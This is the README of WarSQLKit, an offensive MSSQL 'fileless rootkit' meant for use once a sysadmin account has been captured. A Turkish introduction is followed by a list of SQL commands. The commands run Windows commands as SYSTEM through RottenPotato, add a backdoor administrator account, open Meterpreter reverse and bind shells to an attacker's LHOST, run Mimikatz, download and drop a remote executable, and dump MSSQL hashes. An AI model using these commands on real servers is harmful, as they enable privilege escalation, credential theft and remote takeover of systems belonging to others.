# MSSQL Fileless Rootkit - WarSQLKit

Bu araç “sysadmin” haklarına sahip bir hesabının yakalandığı ve “xp_cmdshell”, “sp_OACreate”, “sp_OAMethod” vb. prosedürlerin hiçbirinin çalışmadığı bir senaryo düşünülerek kaleme geliştirilmiştir.

http://eyupcelik.com.tr/guvenlik/493-mssql-fileless-rootkit-warsqlkit

WarSQLKit Command Example
```sql
EXEC sp_cmdExec 'whoami'; => Any Windows command
EXEC sp_cmdExec 'whoami /RunSystemPriv'; => Any Windows command with NT AUTHORITY\SYSTEM rights
EXEC sp_cmdExec '"net user eyup P@ssw0rd1 /add" /RunSystemPriv'; => Adding users with RottenPotato (Kumpir)
EXEC sp_cmdExec '"net localgroup administrators eyup /add" /RunSystemPriv'; => Adding user to localgroup with RottenPotato (Kumpir)
EXEC sp_cmdExec 'powershell Get-ChildItem /RunSystemPS'; => (Powershell) with RottenPotato (Kumpir)
EXEC sp_cmdExec 'sp_meterpreter_reverse_tcp LHOST LPORT GetSystem'; => x86 Meterpreter Reverse Connection with  NT AUTHORITY\SYSTEM
EXEC sp_cmdExec 'sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem'; => x64 Meterpreter Reverse Connection with  NT AUTHORITY\SYSTEM
EXEC sp_cmdExec 'sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem'; => x86 Meterpreter Reverse Connection RC4 with  NT AUTHORITY\SYSTEM, RC4PASSWORD=warsql
EXEC sp_cmdExec 'sp_meterpreter_bind_tcp LPORT GetSystem'; => x86 Meterpreter Bind Connection with  NT AUTHORITY\SYSTEM
EXEC sp_cmdExec 'sp_Mimikatz'; 
select * from WarSQLKitTemp => Get Mimikatz Log. Thnks Benjamin Delpy :)
EXEC sp_cmdExec 'sp_downloadFile http://eyupcelik.com.tr/file.exe C:\ProgramData\file.exe 300';  => Download File
EXEC sp_cmdExec 'sp_getSqlHash';  => Get MSSQL Hash
EXEC sp_cmdExec 'sp_getProduct';  => Get Windows Product
EXEC sp_cmdExec 'sp_getDatabases';  => Get Available Database
```
